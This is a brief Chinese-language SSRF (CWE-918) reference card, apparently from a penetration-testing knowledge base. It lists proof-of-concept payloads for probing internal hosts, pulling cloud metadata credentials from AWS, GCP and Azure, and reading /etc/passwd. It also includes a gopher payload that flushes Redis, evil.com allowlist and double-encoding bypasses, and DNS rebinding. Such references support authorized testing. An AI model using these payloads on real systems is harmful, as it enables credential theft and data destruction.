# SSRF (Server-Side Request Forgery, CWE-918)

## PoC 模板

| 目标 | poc_payload |
|---|---|
| 内网探测 | `http://10.0.0.1:8080/admin` / `http://127.0.0.1:6379/` (Redis) |
| AWS 元数据 | `http://169.254.169.254/latest/meta-data/iam/security-credentials/` |
| GCP 元数据 | `http://metadata.google.internal/computeMetadata/v1/` |
| Azure 元数据 | `http://169.254.169.254/metadata/instance?api-version=2021-02-01` |
| 文件协议 | `file:///etc/passwd` (若 sink 支持 file://) |
| Gopher 打 Redis | `gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a` |
| 绕过白名单 | `http://example.com@evil.com/` / `http://example.com.evil.com/` |
| URL 双编码绕过 | `https://webgoat.local%2540evil.com` (%25=`%`,二次解码后 `@evil.com`) |
| DNS rebinding | 攻击者域名 DNS 第一次解析返回 1.1.1.1，第二次返回 127.0.0.1 |
